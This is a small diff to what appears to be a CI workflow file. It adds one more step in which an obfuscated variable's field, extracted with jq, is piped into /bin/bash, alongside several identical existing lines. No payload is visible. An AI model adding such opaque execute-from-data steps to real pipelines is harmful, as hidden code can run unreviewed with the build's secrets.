@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$nt8508" | jq -r .itto0218 | /bin/bash
           printf '%s' "$se1262" | jq -r .kpfkl7615 | /bin/bash
           printf '%s' "$pt97108" | jq -r .m84300 | /bin/bash
+          printf '%s' "$npb89" | jq -r .mnicx1233 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
